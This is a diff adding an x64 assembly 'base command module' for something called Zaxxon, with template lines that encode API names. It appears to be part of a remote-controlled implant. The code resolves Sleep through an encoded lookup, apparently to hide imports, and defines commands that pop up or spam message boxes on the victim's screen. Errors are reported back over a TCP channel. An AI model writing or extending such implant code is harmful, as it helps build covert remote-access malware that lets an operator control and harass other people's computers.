@@ -1,0 +1,119 @@
+#!name##ZAX_BCMD
+#!types##sfile
+#!info##Zaxxon base command module
+
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+extern MessageBoxA
+extern atoi
+
+
+section .data
+    basc_msgb_label: db "ZAXXON", 0
+    basc_msg_err: db "Error Wrong Command", 10, 0
+    basc_p_slp: dd {{TOOL.AsmSh_encode("Sleep")}} ;Sleep
+
+{% set _ = TOOL.AsmSh_reset_table() %}
+
+section .bss
+    basc_f_slp: resq 1  ; sleep function
+
+section .text
+
+BASC_Init:
+; Initialize module
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    ; get Sleep addr
+    sub rsp, 40
+    mov rcx, basc_p_slp
+    mov rdx, 0
+    call PITF_get
+    add rsp, 40
+    lea rbx, [basc_f_slp]
+    mov [rbx], rax  ; save Sleep addr
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+
+BASC_msgb:
+;show MessageBox with text
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - args struct 4 * 8 bytes
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    mov rbx, rcx
+    
+    sub rsp, 40
+    mov rcx, 0
+    mov rdx, [rbx+8]
+    mov r8, basc_msgb_label
+    mov r9, 0
+    call MessageBoxA
+    add rsp, 40
+    
+    add rsp, 8
+    pop rbp
+    ret
+    
+
+BASC_msgbs:
+; spam screen MessageBox with text
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - args struct 4 * 8 bytes    
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; save pointer to struct
+    
+    ;convert 2nd arg to int
+    sub rsp, 40
+    mov rdx, [rcx + 8]
+    mov rcx, rdx
+    call atoi
+    add rsp, 40
+    cmp rax, 0
+    je .error
+    
+    mov r12, rax    ; save integer
+    xor rbx, rbx
+    .show:
+        cmp rbx, r12
+        je .return
+        sub rsp, 40
+        mov rcx, 0
+        mov rdx, [rbp-8]    ; get struct
+        mov rdx, [rdx + 16] ; get 3rd arg as text
+        mov r8, basc_msgb_label
+        mov r9, 0
+        call MessageBoxA
+        mov rcx, 1000
+        lea rax, [basc_f_slp]
+        mov rax, [rax]
+        call rax    ; call Sleep
+        ;call Sleep
+        add rsp, 40
+        inc rbx
+        jmp .show
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .error:
+        sub rsp, 40
+        mov rcx, basc_msg_err
+        call TCP_send
+        add rsp, 40
+        jmp .return
+
